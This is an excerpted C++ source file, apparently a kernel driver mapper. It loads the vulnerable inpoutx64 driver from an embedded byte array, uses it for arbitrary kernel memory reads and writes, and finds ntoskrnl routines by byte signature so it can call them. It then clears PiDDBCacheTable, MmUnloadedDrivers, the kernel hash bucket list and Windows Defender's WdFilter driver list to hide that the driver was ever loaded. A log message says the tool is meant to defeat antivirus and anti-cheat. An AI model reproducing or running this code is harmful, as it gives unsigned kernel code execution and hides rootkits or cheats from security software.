...
#include "utils.hpp"
#include "vdmPort/vdm/raw_driver.hpp"
#include "service.hpp"
#include "nt.hpp"
...
HANDLE new_driver::hDevice = 0;
ULONG64 new_driver::ntoskrnlAddr = 0;
std::string cachedDriverName = "";


std::wstring new_driver::GetDriverNameW() {
...
std::wstring new_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + new_driver::GetDriverNameW();
}

bool new_driver::IsRunning() {
...
bool new_driver::AcquireDebugPrivilege() {
...
bool new_driver::Load() {
	...
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(vdm::raw_driver), sizeof(vdm::raw_driver))) {
	...
	hDevice = CreateFileW(L"\\\\.\\inpoutx64", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	...
	if (!new_driver::ReadMemory(new_driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		new_driver::Unload();
		return false;
	}

	if (!new_driver::ClearPiDDBCacheTable()) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		new_driver::Unload();
		return false;
	}

	if (!new_driver::ClearKernelHashBucketList()) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		new_driver::Unload();
		return false;
	}

	if (!new_driver::ClearMmUnloadedDrivers()) {
		Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		new_driver::Unload();
		return false;
	}

	if (!new_driver::ClearWdFilterDriverList()) {
...
bool new_driver::ClearWdFilterDriverList() {
		...
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		...
		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			...
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), new_driver::GetDriverNameW().c_str())) {
...
bool new_driver::Unload() {
	...
	int newFileLen = sizeof(vdm::raw_driver) + (((long long)rand() * (long long)rand()) % 2000000 + 1000);
...
/*
bool new_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
...
*/
/* didnt see this used anywhere so commenting it FN
bool new_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;
...
*/
// this needs to be a syscall
bool new_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {

	uintptr_t thouPhysical = vdm::get_physical_address(reinterpret_cast<void*>(address));
	...
	// 3. Success
	*out_physical_address = thouPhysical;
	return true;
	*out_physical_address = thouPhysical;
	return true;
}
...
//port
uint64_t new_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	vdm::map_io_space(physical_address, size);
	return true;
}


//port from my driver
bool new_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	vdm::unmap_io_space(reinterpret_cast<void*>(address), size);
	return true;
}

bool new_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return vdm::read(reinterpret_cast<void*>(address), buffer, size);
}

bool new_driver::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return vdm::write(reinterpret_cast<void*>(address), buffer, size);
}

bool new_driver::WriteToReadOnlyMemory(uint64_t addr, void* buffer, size_t size)
{
	if (!vdm::write_phys(reinterpret_cast<void*>(addr), buffer, size))
	{
		return false;
	}
	return true;
...
/*
bool new_driver::WriteToReadOnlyMemory2(uint64_t address, void* buffer, uint32_t size) {
...
uint64_t new_driver::MmAllocateIndependentPagesEx(uint32_t size)
{
	...
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		...
		kernel_MmAllocateIndependentPagesEx += new_driver::ntoskrnlAddr;
	}
#else
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		...
		kernel_MmAllocateIndependentPagesEx = new_driver::FindPatternInSectionAtKernel((char*)".text", new_driver::ntoskrnlAddr,
	...
	if (!new_driver::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool new_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	...
	if (!kernel_MmFreeIndependentPages)
	{
		...
		kernel_MmFreeIndependentPages += new_driver::ntoskrnlAddr;
#else
		kernel_MmFreeIndependentPages = new_driver::FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr,
	...
	uint64_t result{};
	return new_driver::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN new_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
	...
	if (!kernel_MmSetPageProtection)
	{
		...
		kernel_MmSetPageProtection += new_driver::ntoskrnlAddr;
#else
		//Updated, tested from 1803 to 24H2
		//  0F 45 ? ? 8D ? ? ? FF FF E8
		//  0F 45 ? ? 45 8B ? ? ? ? 8D ? ? ? ? ? ? FF FF E8  (Some windows builds have a instruction in the middle)
		kernel_MmSetPageProtection = new_driver::FindPatternInSectionAtKernel("PAGELK", new_driver::ntoskrnlAddr,
	...
	if (!new_driver::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

uint64_t new_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;
	
	static uint64_t kernel_ExAllocatePool = (uint64_t)util::get_kmodule_export("ntoskrnl.exe", "ExAllocatePoolWithTag");
...
bool new_driver::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(new_driver::ntoskrnlAddr, "ExFreePool");
...
uint64_t new_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
...
bool new_driver::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;
...
PVOID new_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
...
bool new_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(new_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
...
bool new_driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(new_driver::ntoskrnlAddr, "ExReleaseResourceLite");
...
BOOLEAN new_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(new_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
...
PVOID new_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(new_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
...
nt::PiDDBCacheEntry* new_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
...
bool new_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver
	...
	PVOID PiDDBLock = (PVOID)(new_driver::ntoskrnlAddr + PiDDBLockOffset);
	nt::PRTL_AVL_TABLE PiDDBCacheTable = (nt::PRTL_AVL_TABLE)(new_driver::ntoskrnlAddr + PiDDBCacheTableOffset);
#else
	auto PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	auto PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr, (PUCHAR)"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx"); // 66 03 D2 48 8D 0D
	...
	if (PiDDBLockPtr == NULL) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as possible
		PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x"); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if (PiDDBLockPtr == NULL) {
			PiDDBLockPtr = FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xB2\x01\x66\xFF\x88\x00\x00\x00\x00\x90\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x"); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 48 8D 0D ? ? ? ? B2 01 66 FF 88 ? ? ? ? 90 E8 ? ? ? ? 4C 8B ? 24 update for build 26100.1000
			if (PiDDBLockPtr == NULL) {
				Log(L"[-] Warning PiDDBLock not found" << std::endl);
				return false;
			}
	...
	if (PiDDBCacheTablePtr == NULL) {
		PiDDBCacheTablePtr = FindPatternInSectionAtKernel("PAGE", new_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\xF9\x33\xC0\x48\x8D\x0D", "xxxxxxxx"); // 48 8B F9 33 C0 48 8D 0D
		if (PiDDBCacheTablePtr == NULL) {
			Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
			return false;
		}
	...
	auto timestamp = portable_executable::GetNtHeaders((void*)vdm::raw_driver)->FileHeader.TimeDateStamp;
...
uintptr_t new_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress) {
...
uintptr_t new_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;
	BYTE headers[0x1000];
	if (!vdm::read(reinterpret_cast<void*>(modulePtr), headers, 0x1000)) {
...
uintptr_t new_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
...
bool new_driver::ClearKernelHashBucketList() {
